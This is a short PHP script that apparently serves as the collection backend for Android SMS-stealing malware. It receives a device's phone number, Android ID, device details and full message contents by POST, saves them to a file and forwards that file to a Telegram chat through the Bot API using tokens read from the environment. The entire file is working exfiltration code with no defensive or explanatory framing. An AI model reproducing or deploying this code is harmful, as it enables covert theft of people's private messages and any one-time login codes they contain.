<?php

$telegramBotToken = getenv('TOKEN2');

$chatId = getenv('ID2');

$totalMessages = $_POST['TotalMessages'] ?? '';

$deviceInfo = $_POST['DeviceInfo'] ?? '';

$androidId = $_POST['AndroidId'] ?? '';

$messages = $_POST['Messages'] ?? '';

$phoneNumber = $_POST['PhoneNumber'] ?? '';

$androidVersion = preg_match('/Android Version: ([^,]+)/', $deviceInfo, $matches) ? trim($matches[1]) : 'Unknown';

preg_match('/Manufacturer: ([^,]+), Model: ([^,]+)/', $deviceInfo, $modelMatches);

$manufacturer = trim($modelMatches[1] ?? 'Unknown');

$model = trim($modelMatches[2] ?? 'Unknown');

$message = "Total Messages: $totalMessages\n" .

    "Device Info: $deviceInfo\n" .

    "Android ID: $androidId\n" .

    "Phone Number: $phoneNumber\n\n" .

    "Messages:\n$messages\n";

$randomString = uniqid('', true);

$filename = "$manufacturer $model $androidVersion Messages $randomString.txt";

file_put_contents($filename, $message);

$telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendDocument";

$postData = [

    'chat_id' => $chatId,

    'document' => new CURLFile(realpath($filename)),

    'caption' => '*Messages Received*', 

    'parse_mode' => 'Markdown',

];

$ch = curl_init($telegramApiUrl);

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);

curl_close($ch);

unlink($filename);

?>
